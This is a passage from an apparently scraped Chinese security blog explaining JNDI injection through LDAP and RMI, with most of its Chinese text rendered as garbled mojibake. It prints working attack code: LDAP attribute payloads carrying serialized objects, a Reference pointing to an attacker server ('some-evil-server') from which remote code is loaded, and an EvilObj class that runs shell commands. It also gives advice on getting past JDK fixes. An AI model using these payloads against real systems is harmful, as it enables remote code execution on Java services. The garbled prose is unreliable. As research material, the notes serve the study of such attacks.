ReferencesJNDIÂèëËµ∑ldapÁöÑlookupÂêéÔºåÂ∞ÜÊúâÂ¶Ç‰∏ãÁöÑË∞ÉÁî®ÊµÅÁ®ãÔºåËøôÈáåÊàë‰ª¨Áõ¥Êé•Êù•ÂÖ≥Ê≥®ÔºåËé∑ÂæóËøúÁ®ãLDAP ServerÁöÑEntry‰πãÂêéÔºåClientËøôËæπÊòØÊÄé‰πàÂÅöÂ§ÑÁêÜÁöÑ Ë∑üËøõcom/sun/jndi/ldap/Obj.java#decodeObjectÔºåÊåâÁÖßËØ•ÂáΩÊï∞ÁöÑÊ≥®ÈáäÊù•ÁúãÔºåÂÖ∂‰∏ªË¶ÅÂäüËÉΩÊòØËß£Á†Å‰ªéLDAP ServerÊù•ÁöÑÂØπË±°ÔºåËØ•ÂØπË±°ÂèØËÉΩÊòØÂ∫èÂàóÂåñÁöÑÂØπË±°Ôºå‰πüÂèØËÉΩÊòØ‰∏Ä‰∏™ReferenceÂØπË±°„ÄÇÂÖ≥‰∫éÂ∫èÂàóÂåñÂØπË±°ÁöÑÂ§ÑÁêÜÔºåÊàë‰ª¨ÁúãÂêéÈù¢‰∏ÄËäÇ„ÄÇËøôÈáåÊëòÂèñ‰∫ÜReferenceÁöÑÂ§ÑÁêÜÊñπÂºèÔºö 1234567891011121314static Object decodeObject(Attributes attrs) throws NamingException &#123; Attribute attr; // Get codebase, which is used in all 3 cases. String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE])); try &#123; // ... attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);// \"objectClass\" if (attr != null &amp;&amp; (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || // \"javaNamingReference\" attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; // \"javanamingreference\" return decodeReference(attrs, codebases); &#125; //... Â¶ÇÊûúLDAP ServerËøîÂõûÁöÑÂ±ûÊÄßÈáåÂåÖÊã¨‰∫ÜobjectClassÂíåjavaNamingReferenceÔºåÂ∞ÜËøõÂÖ•ReferenceÁöÑÂ§ÑÁêÜÂáΩÊï∞decodeReference‰∏ä 12345678910111213if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) &#123; className = (String)attr.get();&#125; else &#123; throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] + \" attribute is required\");&#125;if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) &#123; factory = (String)attr.get();&#125;Reference ref = new Reference(className, factory, (codebases != null? codebases[0] : null)); decodeReferenceÂÜç‰ªéÂ±ûÊÄß‰∏≠ÊèêÂèñÂá∫javaClassNameÂíåjavaFactoryÔºåÊúÄÂêéÂ∞ÜÁîüÊàê‰∏Ä‰∏™Reference„ÄÇËøôÈáåÂ¶ÇÊûúÁúãËøáÊàëÂâçÈù¢ÁöÑÈÇ£ÁØájndi-with-rmiÔºåÂèØ‰ª•ÁúãÂà∞ÂÖ∂ÂÆûËøôÈáåÁîüÊàêÁöÑrefÂ∞±ÊòØÊàë‰ª¨Âú®RMIËøîÂõûÁöÑÈÇ£‰∏™ReferenceWrapperÔºåÂêéÈù¢Ëøô‰∏™refÂ∞Ü‰ºö‰º†ÈÄíÁªôNaming ManagerÂéªÂ§ÑÁêÜÔºåÂåÖÊã¨‰ªécodebase‰∏≠Ëé∑ÂèñclassÊñá‰ª∂Âπ∂ËΩΩÂÖ•„ÄÇ ËÄåËøôÈáåLDAP‰πüÁ±ª‰ººÔºåÂ§ÑÁêÜrefÁöÑÂØπË±°ÊòØNamingManagerÁöÑÂ≠êÁ±ªjavax/naming/spi/DirectoryManager.javaÔºåÂõ†‰∏∫Ë∑üRMIÊúâÁÇπÁ±ª‰ºº‰∏çÂÖ∑‰ΩìÂàÜÊûê‰∫ÜÔºåÊúÄÂêéÂêåÊ†∑Áî±javax/naming/spi/NamingManager.java#getObjectFactoryFromReferenceÊù•Â§ÑÁêÜ„ÄÇ Âà∞ËøôÈáåÔºåÊàë‰ª¨ÂÜçÊù•Áúãmbechler ÂÆûÁé∞ÁöÑLDAPRefServerÂ∞±ÊØîËæÉÊ∏ÖÊ•ö‰∫Ü ÂΩìÂÖ∂Ëé∑ÂèñÂà∞LDAPËøûÊé•Êó∂ÔºåÂ∞ÜÂ°´ÂÖÖÂ¶Ç‰∏äÁöÑÂá†‰∏™Â±ûÊÄßÂèäÂÖ∂ÂØπÂ∫îÁöÑÂÄºÔºåÂ∞±ÊòØ‰∏∫‰∫ÜÊª°Ë∂≥‰∏äÈù¢ÁöÑÊù°‰ª∂ËÄåÁîüÊàê‰∏Ä‰∏™ReferenceÂØπË±°„ÄÇ 0x03 LDAP with Serialized ObjectJNDIÂØπ‰∫éÂ±ûÊÄß‰∏≠ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÁöÑÂ§ÑÁêÜ‰∏ÄÂÖ±Êúâ‰∏§‰∏™Âú∞ÊñπÔºåÊàë‰ª¨ÂÖàÊù•È°∫ÁùÄÂâçÈù¢ÁöÑJNDI ReferenceÁöÑÊÄùË∑ØËØ¥‰∏ãÂéª Á¨¨‰∏ÄÂ§ÑÔºöcom/sun/jndi/ldap/Obj.java#decodeObjectÂú®com/sun/jndi/ldap/Obj.java#decodeObject‰∏äËøòÂ≠òÂú®‰∏Ä‰∏™Âà§Êñ≠ 1234if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123;// ‚ÄújavaSerializedData‚Äù ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl);&#125; Â¶ÇÊûúÂú®ËøîÂõûÁöÑÂ±ûÊÄß‰∏≠Â≠òÂú®javaSerializedDataÔºåÂ∞ÜÁªßÁª≠Ë∞ÉÁî®deserializeObjectÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞‰∏ªË¶ÅÂ∞±ÊòØË∞ÉÁî®Â∏∏ËßÑÁöÑÂèçÂ∫èÂàóÂåñÊñπÂºèreadObjectÂØπÂ∫èÂàóÂåñÊï∞ÊçÆËøõË°åËøòÂéüÔºåÂ¶Ç‰∏ãpayload„ÄÇ 12345@Overrideprotected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaSerializedData\", serialized);&#125; ËøôÈáåÊàë‰ª¨Â∞±‰∏çÈúÄË¶ÅÈÄöËøáËøúÁ®ãcodebaseÁöÑÊñπÂºèÊù•ËææÊàêRCEÔºåÂΩìÁÑ∂È¶ñÂÖàÊú¨Âú∞ÁéØÂ¢É‰∏äÈúÄË¶ÅÊúâÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊâÄ‰æùËµñÁöÑÂ∫ìÊñá‰ª∂„ÄÇ Á¨¨‰∫åÂ§ÑÔºöcom/sun/jndi/ldap/Obj.java#decodeReferencedecodeReferenceÂáΩÊï∞Âú®ÂØπÊôÆÈÄöÁöÑReferenceËøòÂéüÁöÑÂü∫Á°Ä‰∏äÔºåËøòÂèØ‰ª•Ëøõ‰∏ÄÊ≠•ÂØπRefAddressÂÅöËøòÂéüÂ§ÑÁêÜÔºåÂÖ∂‰∏≠ËøòÂéüËøáÁ®ã‰∏≠Ôºå‰πüË∞ÉÁî®‰∫ÜdeserializeObjectÂáΩÊï∞ÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÈÄöËøáÊª°Ë∂≥RefAddressÁöÑÊñπÂºèÔºå‰πüÂèØ‰ª•ËææÂà∞‰∏äÈù¢Á¨¨‰∏ÄÁßçÁöÑÊïàÊûú„ÄÇ ÂÖ∑‰Ωì‰ª£Á†ÅÂ§™Èïø‰∫ÜÔºåËøôÈáåÊàëÂ∞±ËØ¥‰∏Ä‰∏ãÊù°‰ª∂Ôºö Á¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏∫ÂàÜÈöîÁ¨¶ Á¨¨‰∏Ä‰∏™ÂàÜÈöîÁ¨¶‰∏éÁ¨¨‰∫å‰∏™ÂàÜÈöîÁ¨¶‰πãÈó¥ÔºåË°®Á§∫ReferenceÁöÑpositionÔºå‰∏∫intÁ±ªÂûã Á¨¨‰∫å‰∏™ÂàÜÈöîÁ¨¶‰∏éÁ¨¨‰∏â‰∏™ÂàÜÈöîÁ¨¶‰πãÈó¥ÔºåË°®Á§∫typeÔºåÁ±ªÂûã Á¨¨‰∏â‰∏™ÂàÜÈöîÁ¨¶ÊòØÂèåÂàÜÈöîÁ¨¶ÁöÑÂΩ¢ÂºèÔºåÂàôËøõÂÖ•ÂèçÂ∫èÂàóÂåñÁöÑÊìç‰Ωú Â∫èÂàóÂåñÊï∞ÊçÆÁî®base64ÁºñÁ†Å Êª°Ë∂≥‰∏äÈù¢ÁöÑÊù°‰ª∂ÔºåÊûÑÈÄ†‰∏Ä‰∏™Á±ª‰ººÁöÑ 12345protected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaReferenceAddress\",\"$1$String$$\"+new BASE64Encoder().encode(serialized)); entry.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$&#125; ÂΩìÁÑ∂Á¨¨‰∫åÂ§ÑÂè™ÊòØ‰∏Ä‰∏™Èî¶‰∏äÊ∑ªËä±ÁöÑÊ≠•È™§ÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Áî®Á¨¨‰∏ÄÁßçÊñπÊ≥ïÔºåÁ¨¨‰∫åÁßçÂú®Á¨¨‰∏ÄÁßç‰∏çËÉΩÁî®ÁöÑÊÉÖÂÜµ‰∏ãÂèØ‰ª•ËØïËØï„ÄÇ 0x04 ÂêéÁª≠Ëá™jdk8u191-b02ÁâàÊú¨ÂêéÔºåÊñ∞Ê∑ªÂä†‰∫Ücom.sun.jndi.ldap.object.trustURLCodebaseÈªòËÆ§‰∏∫falseÁöÑÈôêÂà∂Ôºå‰πüÂ∞±ÊÑèÂë≥ÁùÄËøúÁ®ãcodebaseÁöÑReferenceÊñπÂºèË¢´ÈôêÂà∂Ê≠ª‰∫ÜÔºåÊàë‰ª¨Âè™ËÉΩÈÄöËøáSerializedDataÁöÑÊñπÊ≥ïÊù•ËææÊàêÂà©Áî®„ÄÇ Êàë‰ª¨Êù•Êï¥ÁêÜ‰∏Ä‰∏ãÔºåÂÖ≥‰∫éjndiÁöÑÁõ∏ÂÖ≥ÂÆâÂÖ®Êõ¥Êñ∞ JDK 6u132, JDK 7u122, JDK 8u113‰∏≠Ê∑ªÂä†‰∫Ücom.sun.jndi.rmi.object.trustURLCodebase„ÄÅcom.sun.jndi.cosnaming.object.trustURLCodebase ÁöÑÈªòËÆ§ÂÄºÂèò‰∏∫false„ÄÇ ÂØºËá¥jndiÁöÑrmi referenceÊñπÂºèÂ§±ÊïàÔºå‰ΩÜldapÁöÑreferenceÊñπÂºè‰ªçÁÑ∂ÂèØË°å Oracle JDK 11.0.1„ÄÅ8u191„ÄÅ7u201„ÄÅ6u211‰πãÂêé com.sun.jndi.ldap.object.trustURLCodebaseÂ±ûÊÄßÁöÑÈªòËÆ§ÂÄºË¢´Ë∞ÉÊï¥‰∏∫false„ÄÇ ÂØºËá¥jndiÁöÑldap referenceÊñπÂºèÂ§±ÊïàÔºåÂà∞ËøôÈáå‰∏∫Ê≠¢ÔºåËøúÁ®ãcodebaseÁöÑÊñπÂºèÂü∫Êú¨Â§±ÊïàÔºåÈô§ÈùûËÆ§‰∏∫ËÆæ‰∏∫true ËÄåÂú®ÊúÄÊñ∞ÁâàÁöÑjdk8u‰∏äÔºåjndi ldapÁöÑÊú¨Âú∞ÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ1Âíå2ÁöÑÊñπÂºè‰ªçÁÑ∂Êú™Â§±ÊïàÔºåjndi rmiÂ∫ïÂ±Ç(JRMPListener)StreamRemoteCallÁöÑÊú¨Âú∞Âà©Áî®ÊñπÂºè‰ªçÊú™Â§±Êïà„ÄÇ ÊâÄ‰ª•Â¶ÇÊûúReferenceÁöÑÊñπÂºè‰∏çË°åÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ËØïËØïÂà©Áî®Êú¨Âú∞ClassPathÈáåÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊù•ËææÊàêRCE„ÄÇ 0x05 ÊÄªÁªìJNDIÂíåLDAPÁöÑÁªìÂêàÔºåÂá∫Áé∞‰∫Ü2ÁßçÂà©Áî®ÊñπÂºèÔºå‰∏ÄÊòØÂà©Áî®ËøúÁ®ãcodebaseÁöÑÊñπÂºèÔºå‰∫åÊòØÂà©Áî®Êú¨Âú∞ClassPathÈáåÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ„ÄÇÂú®ÊúÄÊñ∞ÁâàÁöÑjdk8u‰∏≠ÔºåcodebaseÁöÑÊñπÂºè‰æùËµñcom.sun.jndi.ldap.object.trustURLCodebaseÁöÑÂÄºÔºåËÄåÁ¨¨‰∫åÁßçÊñπÂºè‰ªçÊú™Â§±Êïà„ÄÇ LDAPÁöÑ‰ΩøÁî®ÊñπÊ≥ïÈô§‰∫ÜJNDIÁöÑlookupÔºåÂÖ∂‰ªñÁöÑÂ∫ì‰πü‰ºöÊúâÁõ∏Â∫îÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºåÂ¶ÇSpringÁöÑldapÔºåËøôÈáåËøòÂèØ‰ª•ÁªßÁª≠Ê∑±ÂÖ•‰∏ãÂéªÔºåÂÖàÊåñ‰∏™ÂùëXD ÊúÄÂêéÔºå‰∏äÈù¢ÁöÑ‰∏§‰∏™ldap ServerÊõ¥Êñ∞Âà∞‰∫Ügithub‰∏äÔºåËá™ÂèñXD"},{"title":"„Äênotes„ÄëJNDI with RMI","permalink":"http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/","text":"0x00 ÂâçË®ÄÂú®Áé∞ÂÆûÁéØÂ¢É‰∏≠ÔºåÈÅáÂà∞RMI RegistryÁöÑÊú∫‰ºöÂæàÂ∞ëÔºåËÄåÁªìÂêàÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑJNDIÊ≥®ÂÖ•ÂàôÂ∏∏ËßÅ‰∫ÜËÆ∏Â§ö„ÄÇÊú¨ÊñáÂ∞Ü‰ªãÁªçRMIÁªìÂêàJNDIÂêéÂèØ‰ª•ÂÅöÂì™‰∫õ‰∫ãÊÉÖXD 0x01 Âü∫Á°ÄÂú®ÁúãJNDIÂêåRMIÁöÑÂà©Áî®ÂâçÔºåÊàë‰ª¨ÂÖàÊù•ÁúãÁúãÂÖ≥‰∫éRMIÂä®ÊÄÅÁ±ªÂä†ËΩΩÁöÑÊ¶ÇÂøµ„ÄÇ RMIÂä®ÊÄÅÁ±ªÂä†ËΩΩRMIÊúâ‰∏Ä‰∏™ÈáçË¶ÅÁöÑÁâπÊÄßÊòØÂä®ÊÄÅÁ±ªÂä†ËΩΩÊú∫Âà∂ÔºåÂΩìÊú¨Âú∞CLASSPATH‰∏≠Êó†Ê≥ïÊâæÂà∞Áõ∏Â∫îÁöÑÁ±ªÊó∂Ôºå‰ºöÂú®ÊåáÂÆöÁöÑcodebaseÈáåÂä†ËΩΩclass„ÄÇcodebaseÂèØ‰ª•Âú®Á≥ªÁªüÂ±ûÊÄßjava.rmi.server.codebaseËÆæÁΩÆÂÖ∂URL„ÄÇÂ¶ÇÊûúcodebaseÁöÑURLÂèØÊéßÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ËΩΩÂÖ•‰ªªÊÑèÁöÑclassÊàñjarÊñá‰ª∂„ÄÇÊ†πÊçÆPÁâõÁöÑJavaÂÆâÂÖ®Êº´Ë∞à- RMIÁØá‰∏≠ÊèêÂà∞ÔºåÈÄöËøá‰øÆÊîπ‰º†ÈÄíËøáÁ®ã‰∏≠ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÂ∞ÜÂÖ∂‰∏≠ÁöÑcodebase‰øÆÊîπ‰∏∫ÊÅ∂ÊÑèÁöÑserverÔºåËøôÊ†∑ÂèØ‰ª•ËææÂà∞RMI ServerÁ´ØË¢´ÊîªÂáªÁöÑÊïàÊûú„ÄÇ‰∏çËøáÔºåËøô‰∏™Âà©Áî®Êù°‰ª∂ÊØîËæÉËãõÂàªÔºåÂπ∂‰∏îoracleÂú®ÂêéÈù¢ÂØπÂÖ∂ÂÅö‰∫ÜÈôêÂà∂ÔºåÂ¶ÇÊûúË¶ÅÊàêÂäüÂà©Áî®ÈúÄË¶ÅÊª°Ë∂≥Â¶Ç‰∏ãË¶ÅÊ±ÇÔºö ÂÆâË£ÖÂπ∂ÈÖçÁΩÆ‰∫ÜSecurityManager JavaÁâàÊú¨‰Ωé‰∫é7u21Ôºå6u45ÊàñËÄÖËÆæÁΩÆ‰∫Üjava.rmi.server.useCodebaseonly=false ÊëòËá™JavaÂÆâÂÖ®Êº´Ë∞à-RMIÁØá ÂÖ∂‰∏≠‰∏äÈù¢ÁöÑÈÖçÁΩÆÔºåÂú®7u21Ôºå6u45ÂêéÁöÑÁâàÊú¨ÈáåÈªòËÆ§‰∏∫trueÔºåÈÇ£‰πà‰πüÂ∞±Êó†Ê≥ï‰ªéËøúÁ®ãcodebase‰∏≠ËΩΩÂÖ•Á±ªÔºåÈÅøÂÖç‰∫Ü‰∏äÈù¢ËØ¥ÁöÑËøôÁßçÊîªÂáªÁöÑÂèØËÉΩÊÄß„ÄÇ JNDIÁöÑÁõ∏ÂÖ≥Ê¶ÇÂøµ Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf JNDIÊñπ‰æø‰∫Ü‰∏énaming serviceÂíåDirectory serviceÁöÑ‰∫§‰∫íÔºåÈÄöËøáÊåáÂÆöÁâπÂÆöÁöÑURLÂç≥ÂèØ‰∏é‰∏çÂêåÁöÑÊúçÂä°ËøõË°å‰∫§‰∫í„ÄÇÁõ∏ÂΩì‰∫éÂØπËøô‰∫õÊúçÂä°ÁöÑAPIÂèàËøõË°å‰∫Ü‰∏ÄÊ¨°Â∞ÅË£Ö‰æõÂºÄÂèë‰∫∫Âëò‰ΩøÁî®„ÄÇÂÖ∂‰∏≠JNDI‰∏≠‰πüÂ≠òÂú®‰∏äËø∞RMI codebaseÁöÑÂä®ÊÄÅÂä†ËΩΩÊú∫Âà∂ÔºåÂπ∂‰∏îÂÖ∂ÈÖçÁΩÆÂêåÂ∫ïÂ±ÇÁöÑRMIÈÖçÁΩÆÂπ∂‰∏çÁõ∏ÂÖ≥„ÄÇ ‰ªé‰∏äËø∞ÁöÑÊûÑÊû∂Êù•ÁúãÔºåÂä®ÊÄÅÂä†ËΩΩÂèëÁîü‰∫é‰∏§‰∏™ÈÉ®ÂàÜÔºåNaming ManagerÂíåJNDI SPI„ÄÇËøôÈáåSPIÈÉ®ÂàÜÂ∞±ÊòØÁõ∏ÂØπÂ∫îÁöÑÊúçÂä°ÁöÑÈÖçÁΩÆÔºåÊØîÂ¶ÇÂâçÊñáÊèêÂà∞ÁöÑRMIÁöÑÈôêÂà∂Â∞±ÊòØSPIÈÉ®ÂàÜÁöÑ„ÄÇËÄåNaming Manager‰πüÂ≠òÂú®‰∏Ä‰∏™Âä®ÊÄÅÂä†ËΩΩÊú∫Âà∂Âπ∂‰∏îÂÖ∂Âú®‰øÆÂ§çÂâçÂπ∂Êó†ÈôêÂà∂ÔºåËøôÈáåNaming ManagerÈÉ®ÂàÜÁî®Âà∞ÁöÑÊòØJNDIÁöÑNaming References In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate. For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf ËøôÈáåÊèêÂà∞Áî±‰∫éÊüê‰∫õÊÉÖÂÜµ‰∏çËÉΩÁõ¥Êé•Â∞ÜËøúÁ®ãobjËøîÂõûÔºåÊâÄ‰ª•JNDIÊèêÂá∫‰∫ÜNaming ReferencesÁöÑÊñπÊ≥ïÔºåËøîÂõûÁõ∏Â∫îÁöÑReferenceËÄå‰∏çËøîÂõûÂÖ∑‰ΩìÁöÑobj„ÄÇÁªü‰∏ÄÁî±JNDIÁöÑËØ∑Ê±ÇÁ´ØÂéªÂä†ËΩΩÊåáÂÆöÁöÑÂú∞ÂùÄ‰∏äÁöÑobj„ÄÇËøôÈáåÂä†ËΩΩÊñπÊ≥ï‰∏≠Â∞±ÂåÖÊã¨ËøúÁ®ãcodebaseÁöÑÊñπÊ≥ïÔºåÊù•Áúã‰∏™‰æãÂ≠ê 1234String FactoryURL = \"http://some-evil-server\";Reference reference = new Reference(\"MyClass\",\"MyClass\",FactoryURL);ReferenceWrapper wrapper = new ReferenceWrapper(reference);ctx.bind(\"Foo\", wrapper);// ÁªëÂÆöreference ËØ∑Ê±ÇÁ´Ø‰ª•lookupËØ∑Ê±Ç‰∏äËø∞ÁªëÂÆöÁöÑRMIÊúçÂä°Âç≥ÂèØ„ÄÇÂÖ∂Â§ÑÁêÜËøáÁ®ãÂºïÁî®https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 0x02 ÂéüÁêÜJNDI with RMI DEMO‰∏∫‰∫ÜÊõ¥Â•ΩÁöÑËØ¥ÊòéÔºå‰ª•‰∏ãÈù¢ÁöÑ‰ª£Á†Å‰∏∫‰æã 1234567891011121314151617181920212223package train.jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;/** * @author wh1t3P1g * @since 2020/2/4 */public class Server &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); String FactoryURL = \"http://localhost/\"; Reference reference = new Reference(\"EvilObj\",\"EvilObj\",FactoryURL); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"Foo\", wrapper); &#125;&#125; ServerÁ´Ø‰ª•RMI RegistryÊ≥®ÂÜå‰∏Ä‰∏™ReferenceÔºåÂπ∂Â∞ÜfactoryURLÊåáÂÆö‰∏∫localhost 123456789101112131415package train.jndi;import javax.naming.Context;import javax.naming.InitialContext;/** * @author wh1t3P1g * @since 2020/2/4 */public class Client &#123; public static void main(String[] args) throws Exception &#123; Context ctx = new InitialContext(); ctx.lookup(\"rmi://localhost:1099/Foo\"); &#125;&#125; ClientÁ´ØÊØîËæÉÁÆÄÂçïÔºåÁõ¥Êé•‰ª•lookupÊåáÂÆöÁöÑRMI URLÂç≥ÂèØ„ÄÇÊ†πÊçÆ‰∏äÈù¢ÁöÑËøáÁ®ãÂõæÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÁöÑÊòØÊúÄÁªàÊâßË°åEvilObjÁöÑÂú∞ÊñπÊòØClientÁ´Ø(jndiÂèëËµ∑lookupÁöÑÊñπÊ≥ï)„ÄÇÊúÄÂêéÊàë‰ª¨Âàõ‰∏Ä‰∏™EvilObj 123456789101112/** * @author wh1t3P1g * @since 2020/2/4 */public class EvilObj &#123; public EvilObj() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"/bin/sh\", \"-c\", \"open /System/Applications/Calculator.app\"&#125;; rt.exec(commands); &#125;&#125; javac EvilObj.javaÁîüÊàêEvilObj.classÔºåÁÑ∂ÂêéÊåÇËΩΩÂà∞‰∏Ä‰∏™webÊúçÂä°‰∏äÂ∞±ÂèØ‰ª•‰∫Ü„ÄÇÂèØ‰ª•Áõ¥Êé•ÈÄâÊã©pythonÊù•ÊåÇËΩΩ ÈÇ£‰πàÊàë‰ª¨Êù•ÂÖ∑‰ΩìÁúã‰∏Ä‰∏ãlookupÂáΩÊï∞ÂÖ∑‰ΩìÂÅö‰∫Ü‰ªÄ‰πà È¶ñÂÖàInitialContextÁöÑlookupÂáΩÊï∞Ôºå‰ºöÊ†πÊçÆÊèê‰æõÁöÑURLËá™Âä®ÈÄâÊã©ÂêàÈÄÇÁöÑInitialContextÔºàÂàÜÁ¶ªÂá∫ÂçèËÆÆÂêéËøõË°åÈÄâÊã©ÔºâÔºåÊØîÂ¶ÇÊ≠§Êó∂ÁöÑInitialContext‰∏∫rmiURLContext ÁªßÁª≠Ë∑üËøõcom/sun/jndi/toolkit/url/GenericURLContext.java#lookup ËøôÈáåÁöÑctx‰∏∫RegistryContextÔºåÂ∞ÜÂØπÊåáÂÆöÁöÑRMI RegistryËé∑ÂèñÁªëÂÆöÁöÑobj Ëé∑ÂèñÂà∞ËøúÁ®ãÂØπË±°ÔºåÂπ∂Ë∞ÉÁî®decodeObjectÂáΩÊï∞ Â¶ÇÊûúÂΩìÂâçÁöÑremoteÂØπË±°ÊòØRemoteReferenceÁ±ªÂûãÔºåÂàôËøõ‰∏ÄÊ≠•ËØ∑Ê±ÇRegistryËé∑ÂèñËØ•ReferenceÁöÑÂÜÖÂÆπ„ÄÇÂà∞ËøôÈáå‰∏∫Ê≠¢ÔºåÊàë‰ª¨Êé•‰∏ãÊù•ÁöÑËØ∑Ê±ÇÂ∞±ÂêåServerÁ´ØÁöÑÂÖ≥Á≥ª‰∏çÂ§ß‰∫ÜÔºåClient‰ºöÊ†πÊçÆÊãøÂà∞ÁöÑReferenceËØ∑Ê±ÇÁõ∏Â∫îÁöÑÊúçÂä°Âô® ÁªßÁª≠Ë∑üËøõgetObjectInstance ËøôÈáå‰ºöÁªßÁª≠Ë∞ÉÁî®NamingManagerÁöÑgetObjectFactoryFromReferenceÔºåËØ•ÂáΩÊï∞ÂÆåÊàê‰∫ÜÂêëFactoryURLËØ∑Ê±ÇÂÖ∑‰ΩìÁöÑclassÊñá‰ª∂ÁöÑÂäüËÉΩ„ÄÇ ËøôÈáåÂèØ‰ª•ÁúãÂà∞ÔºåÊ†πÊçÆfactoryNameÂíåcodebaseÂ∞ÜËøúÁ®ãËΩΩÂÖ•Áõ∏Â∫îÁöÑclassÊñá‰ª∂(ËøôÈáåÁöÑloadClassÁî®ÁöÑURLClassLoaderÊù•ÂÆåÊàê‰ªªÂä°) Âπ∂Âú®Á¨¨163Ë°åÂØπËΩΩÂÖ•ÁöÑobjËøõË°åÂàùÂßãÂåñÔºåËøô‰πüÂ∞±ÊòØ‰∏∫‰ªÄ‰πàÊàë‰ª¨ÈúÄË¶ÅÊääpayloadÂÜôÂú®ÊûÑÈÄ†ÂáΩÊï∞Èáå„ÄÇ Âú®Âà©Áî®‰∏≠ÔºålookupÂáΩÊï∞ÁöÑÂèÇÊï∞ÂøÖÈ°ªÊòØÂèØÊéßÁöÑÔºåÊàñËÄÖÂà©Áî®ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑÊñπÂºèÊù•ÂÆåÊàêÔºåÊØîÂ¶Ç‰∏ãÈù¢ÁöÑ‰∏§‰∏™Ê°à‰æã Ê°à‰æã‰∏ÄÔºöSpringÊ°ÜÊû∂ÁöÑJtaTransactionManagerÁ±ª16Âπ¥ÁöÑÊó∂ÂÄôSpringÊ°ÜÊû∂Êö¥‰∫Ü‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÁöÑÂèØÂà©Áî®ÁÇπJtaTransactionManagerÔºåÂÖ∂ÂéüÁêÜÂ∞±ÊòØÂà©Áî®‰∫ÜJNDI ÂèØÊéßÁöÑlookupÂèÇÊï∞ÔºàËøôÈáåÁöÑÂèØÊéßÁî±ÂèçÂ∫èÂàóÂåñÊù•ÂÆåÊàêÔºâ„ÄÇÊù•Áúã‰∏Ä‰∏ãÂéüÁêÜ org/springframework/transaction/jta/JtaTransactionManager.java#readObject ËøôÈáå1230Ë°åÂàùÂßãÂåñ‰∫Ü‰∏Ä‰∏™jdniÁöÑcontextÔºåËøô‰∏™contextÂ∞ÜÁî®‰∫éÂêéÁª≠ÁöÑJNDI lookup ÁªßÁª≠Ë∑üËøõinitUserTransactionAndTranscationManager ÁªßÁª≠Ë∑üËøõlookupUserTransaction ËøôÈáåÊúÄÁªàË∞ÉÁî®‰∫ÜcontextÁöÑlookupÂáΩÊï∞ÔºåÂπ∂‰∏îÂÖ∂ÂèÇÊï∞‰∏∫userTransactionNameÔºåËøô‰∏™ÈÉ®ÂàÜÊàë‰ª¨ÂèØ‰ª•Âú®Â∫èÂàóÂåñÂâçËøõË°åÊûÑÈÄ†Ôºå‰æãÂ¶Ç‰∏ãÈù¢ÁöÑ‰ª£Á†Å(Êõ¥Êñ∞Âú®‰∫ÜysoserialÁöÑspring3‰∏ä) Âà∞‰∫ÜÂ¶Ç‰ªä2020Âπ¥ÔºåËøô‰∏™Á±ªÁöÑÂà©Áî®‰ªçÁÑ∂Â≠òÂú®‰∫éÊúÄÊñ∞ÁâàÁöÑSpring-txÁªÑ‰ª∂‰∏äXD Ê°à‰æã‰∫åÔºöFastJSONÂèçÂ∫èÂàóÂåñPOC 